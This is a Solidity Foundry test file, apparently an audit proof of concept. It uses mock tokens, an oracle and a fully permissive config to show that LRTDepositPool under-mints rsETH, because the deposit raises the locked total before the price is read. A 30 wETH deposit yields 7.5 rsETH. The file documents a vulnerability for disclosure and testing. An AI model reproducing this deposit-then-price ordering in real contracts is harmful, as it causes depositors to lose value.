pragma solidity 0.8.21;

import "forge-std/Test.sol";
import "../../src/LRTDepositPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ILRTOracle {
    function getAssetPrice(address asset) external view returns (uint256);
    function getRSETHPrice() external view returns (uint256);
}

/*//////////////////////////////////////////////////////////////
                            Mock Tokens
//////////////////////////////////////////////////////////////*/

contract MockERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MockRSETH is ERC20, IRSETH {
    constructor() ERC20("rsETH", "rsETH") {}

    function mint(address to, uint256 amount) external override {
        _mint(to, amount);
    }
}

/*//////////////////////////////////////////////////////////////
                         Mock LRT Oracle
    - assetPrice:       always 1e18 (1:1 with ETH)
    - rsETHPrice:       totalLocked / rsETHSupply
//////////////////////////////////////////////////////////////*/

contract MockOracle is ILRTOracle {
    address public immutable depositPool;
    address public immutable asset;
    address public immutable rsETH;

    constructor(address _depositPool, address _asset, address _rsETH) {
        depositPool = _depositPool;
        asset = _asset;
        rsETH = _rsETH;
    }

    function getAssetPrice(address) external pure override returns (uint256) {
        return 1e18; // peg 1:1
    }

    function getRSETHPrice() external view override returns (uint256) {
        uint256 totalLocked = LRTDepositPool(depositPool).getTotalAssetDeposits(asset);
        uint256 supply = IERC20(rsETH).totalSupply();
        if (supply == 0) return 1e18;
        return (totalLocked * 1e18) / supply;
    }
}

/*//////////////////////////////////////////////////////////////
                     Mock LRT Config contract
    â€“ very permissive: every address is supported asset & role
//////////////////////////////////////////////////////////////*/

contract MockLRTConfig {
    address public immutable oracle;
    address public immutable rsEth;
    mapping(address => uint256) internal _depositLimit;

    constructor(address _oracle, address _rsEth) {
        oracle = _oracle;
        rsEth = _rsEth;
    }

    /* ------------  functions consumed by LRTDepositPool ------------- */

    function depositLimitByAsset(address asset) external view returns (uint256) {
        return _depositLimit[asset];
    }

    function getContract(bytes32) external view returns (address) {
        // LRTDepositPool queries LRTConstants.LRT_ORACLE; return oracle for any key
        return oracle;
    }

    function rsETH() external view returns (address) {
        return rsEth;
    }

    function isSupportedAsset(address) external pure returns (bool) {
        return true;
    }

    /* ----------------- helper for tests ----------------------------- */
    function setDepositLimit(address asset, uint256 limit) external {
        _depositLimit[asset] = limit;
    }

    /* ------------- dummy role helpers to satisfy modifiers ---------- */
    function hasRole(bytes32, address) external pure returns (bool) {
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
                        Exploit Test
//////////////////////////////////////////////////////////////*/

contract ExploitTest is Test {
    LRTDepositPool depositPool;
    MockERC20 asset;      // underlying asset token (e.g., stETH)
    MockRSETH rsEth;      // receipt token
    MockOracle oracle;
    MockLRTConfig config;

    address attacker = address(0xBEEF);      // user that triggers under-mint
    address previousDepositor = address(0xCAFE); // existing liquidity provider

    uint256 constant ONE = 1e18;

    function setUp() public {
        /* ---------------- deploy mocks ---------------- */
        asset = new MockERC20("Wrapped ETH", "wETH");
        rsEth = new MockRSETH();

        depositPool = new LRTDepositPool();

        /* ------------- create oracle & config ---------- */
        oracle = new MockOracle(address(depositPool), address(asset), address(rsEth));
        config = new MockLRTConfig(address(oracle), address(rsEth));

        // generous deposit limit
        config.setDepositLimit(address(asset), type(uint256).max);

        /* ------------- initialise deposit pool -------- */
        depositPool.initialize(address(config));

        /* ---- Simulate existing protocol state -------- */
        uint256 initialLocked = 10 ether;          // 10 wETH already locked
        asset.mint(address(depositPool), initialLocked);

        uint256 initialSupply = 10 ether;          // 10 rsETH already minted
        rsEth.mint(previousDepositor, initialSupply);

        /* ---- prepare attacker funds ----------------- */
        asset.mint(attacker, 30 ether);            // attacker will deposit 30 wETH
    }

    /*
        Demonstrates that attacker receives only 7.5 rsETH instead of the
        economically correct 30 rsETH because the deposit amount is added to
        `totalLocked ` _before_ rsETH price is fetched from the oracle.
    */
    function testUnderMintExploit() public {
        vm.startPrank(attacker);

        asset.approve(address(depositPool), 30 ether);

        uint256 attackerRsEthBefore = rsEth.balanceOf(attacker);

        depositPool.depositAsset(address(asset), 30 ether);

        uint256 attackerRsEthAfter = rsEth.balanceOf(attacker);
        uint256 minted = attackerRsEthAfter - attackerRsEthBefore;

        /* ----------- calculate vulnerable outcome -------------- */
        uint256 expectedPriceAfterTransfer =
            ((10 ether + 30 ether) * ONE) / 10 ether; // 4e18

        uint256 expectedMinted =
            (30 ether * ONE) / expectedPriceAfterTransfer; // 7.5 ether

        assertEq(minted, expectedMinted, "received rsETH matches under-mint calculation");

        /* ----------- prove economic loss ----------------------- */
        assertLt(minted, 30 ether, "attacker was under-minted");
        vm.stopPrank();
    }
}